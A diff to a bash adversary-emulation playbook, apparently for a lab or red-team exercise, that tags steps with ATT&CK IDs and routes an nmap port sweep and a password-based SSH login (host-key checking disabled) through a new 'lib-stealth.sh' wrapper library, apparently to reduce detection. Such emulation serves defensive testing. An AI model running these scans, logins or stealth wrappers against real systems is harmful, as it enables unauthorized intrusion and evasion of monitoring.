@@ -16,6 +16,7 @@
 #   use of credentials discovered earlier                            (T1552.004/.001)
 # ---------------------------------------------------------------------------
 set -u
+source "$(cd "$(dirname "$0")" && pwd)/lib-stealth.sh"
 
 RESULTS_DIR="${RESULTS_DIR:-/home/root/results}"
 INTERNAL_HOST="${INTERNAL_HOST:-internal-host}"
@@ -39,14 +40,17 @@ fi
 say "internal-host resolved to $TARGET_IP"
 
 step "network discovery — sweep internal host for open services (ATT&CK T1046)"
-nmap -Pn -n -p 22,80,443,2222 --reason "$TARGET_IP" 2>&1 | tee -a "$LOG"
+st_mark T1046 "scan-internal-host"
+st_scan "$TARGET_IP" 22,80,443,2222 | tee -a "$LOG"
 
 step "remote services — SSH login using decoy credentials (ATT&CK T1021.004)"
 if ! command -v sshpass >/dev/null 2>&1; then
     say "!! sshpass not installed — run: bash playbooks/install-extra-tools.sh"
     exit 1
 fi
-RESULT="$(sshpass -p "$SSH_PASS" ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
+st_mark T1021.004 "ssh-login"
+st_sshpass "$SSH_PASS"
+RESULT="$("${ST_SSHPASS[@]}" ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
     "${SSH_USER}@${TARGET_IP}" "id; hostname" 2>&1)"
 say "ssh login attempt result:"
 echo "$RESULT" | tee -a "$LOG"
